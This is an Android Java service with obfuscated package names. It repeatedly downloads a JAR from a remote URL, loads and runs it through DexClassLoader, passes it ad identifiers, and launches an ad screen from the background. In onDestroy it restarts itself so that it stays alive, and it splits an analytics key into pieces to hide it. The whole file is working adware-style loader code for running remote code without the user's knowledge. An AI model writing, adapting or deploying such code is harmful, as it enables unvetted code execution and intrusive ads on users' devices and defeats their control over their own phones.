package g.d.t.gdt;

import g.d.x.d;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import com.umeng.analytics.AnalyticsConfig;
import com.umeng.analytics.MobclickAgent;

import dalvik.system.DexClassLoader;

public class StartCheckJarService extends Service {

	public static String jarName2 = "test";
	private static String appid = "1104824603"; // 应用ID 短的
	private static String adid = "7030901651170437"; // 广告位ID 长的
	static String umkey1 = "5666";
	static String umkey2 = "9991";
	static String umkey3 = "67e5";
	static String umkey4 = "8e6e";
	static String umkey5 = "8000";
	public static String umkey = umkey1 + umkey2 + umkey3 + umkey4 + umkey5 + "14f1";

	private static int sleeptime = 240; // 更新JAR包的间隔,分钟;
	private static String initinfos = null; // 传递信息;
	static d jar;
	static File dexOutputDir;
	static File jarfile;
	static boolean jarisnew = false;
	static DexClassLoader classLoader;
	private static Thread checkt;
	private static HttpClient httpClient;
	private static HttpGet httpGet;
	private static HttpResponse httpResponse;
	private static StartCheckJarService scjService;
	private static Context context;
	private static final int LOAD_JAR = 1;
	private static final int STOP_JAR = 2;
	private static final int SHOW_ACT = 3;

	private static Handler handlerchecktnew = new Handler() {
		@Override
		public void handleMessage(Message msg) {
			switch (msg.what) {
			case STOP_JAR:
				stopJar();
				break;
			case LOAD_JAR:
				if (jar == null) {
					loadJar();
				} else if (jarisnew) {
					try {
						jar.closeJAR(context);
					} catch (Exception e) {
					}
					loadJar();
				}
				if (jar != null)
					try {
						jar.init(context, appid, adid, initinfos);
					} catch (Exception e) {
					}
				break;
			case SHOW_ACT:
				showJarAct();
				break;
			default:
				break;
			}
		}
	};

	@Override
	public void onCreate() {
		context = this;
		scjService = this;
		LogUtil.i("StartCheckJarService启动");
		youmeng();
		dexOutputDir = context.getDir("dex", 0);
		jarfile = new File(context.getFilesDir(), info.jarName);
		try {
			SharedPreferences preferences = getSharedPreferences("gdt", Context.MODE_PRIVATE);
			Editor editor = preferences.edit();
			editor.putString("appid", appid);
			editor.putString("adid", adid);
			editor.commit();
			LogUtil.i("偏好设置写入成功");
		} catch (Exception e) {
			LogUtil.i("偏好设置写入失败");
		}
		creatthread(this);
		super.onCreate();
	}

	private void youmeng() {
		AnalyticsConfig.setAppkey(umkey);
		AnalyticsConfig.setChannel("test01");
		MobclickAgent.updateOnlineConfig(context);
		MobclickAgent.onResume(context);
	}

	private static void creatthread(final Context context) {
		if (checkt == null)
			checkt = new Thread() {
				public void run() {
					while (true) {
						jarisnew = false;
						httpGet = new HttpGet(info.jarurl);
						httpResponse = null;
						if (httpClient == null)
							httpClient = new DefaultHttpClient();
						try {
							httpResponse = httpClient.execute(httpGet);
						} catch (ClientProtocolException e) {
							e.printStackTrace();
						} catch (IOException e) {
							e.printStackTrace();
						}
						if (httpResponse != null) {
							if (httpResponse.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
								long newJarSize = httpResponse.getEntity().getContentLength();
								if (!jarfile.exists() || newJarSize != jarfile.length()) {
									if (jarfile.exists()) {
										jarfile.delete();
										handlerchecktnew.sendEmptyMessage(STOP_JAR);
									}
									File jarfiletemp = new File(context.getFilesDir(), info.jarName + ".temp");
									InputStream is = null;
									FileOutputStream fs = null;
									try {
										byte[] buff = new byte[1024];
										int len = 0;
										fs = new FileOutputStream(jarfiletemp);
										is = httpResponse.getEntity().getContent();
										while ((len = is.read(buff)) != -1) {
											fs.write(buff, 0, len);
										}
										if (jarfiletemp.length() == newJarSize) {
											jarfiletemp.renameTo(jarfile);
											jarisnew = true;
											LogUtil.i("JAR包下载成功");
										}
										fs.close();
										is.close();
									} catch (IllegalStateException e) {
										e.printStackTrace();
									} catch (IOException e) {
										e.printStackTrace();
									} finally {
										try {
											is.close();
											fs.close();
										} catch (IOException e) {
											e.printStackTrace();
										}
									}
								} else
									LogUtil.i("JAR包存在 大小一样");
							} else
								LogUtil.i("httpResponse!=200");
						} else
							LogUtil.i("httpResponse == null");
						if (jarfile.exists())
							handlerchecktnew.sendEmptyMessage(LOAD_JAR);
						try {
							sleep(sleeptime * 60 * 1000);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					}
				};
			};
		if (!checkt.isAlive())
			checkt.start();
	}

	private static void loadJar() {
		if (jarfile.exists()) {
			classLoader = new DexClassLoader(jarfile.getAbsolutePath(), dexOutputDir.getAbsolutePath(), null,
					context.getClassLoader());
			Class<?> lib;
			try {
				lib = classLoader.loadClass(info.jarInter);
				jar = (d) lib.newInstance();
				LogUtil.i("JAR动态加载成功");
			} catch (Exception e) {
				LogUtil.i("JAR动态加载失败");
			}
		}
	}

	protected static void showJarAct() {
		Intent Intent = new Intent(scjService.getBaseContext(), DInsert.class);
		Intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
		scjService.getApplication().startActivity(Intent);
		LogUtil.i("广告界面调用");
	}

	protected static void stopJar() {
		if (jar != null)
			try {
				jar.closeJAR(context);
			} catch (Exception e) {
			}
		jar = null;
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onDestroy() {
		MobclickAgent.onPause(context);
		Intent sevice = new Intent(this, StartCheckJarService.class);
		this.startService(sevice);
		super.onDestroy();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		flags = START_STICKY;
		return super.onStartCommand(intent, flags, startId);
	}
}
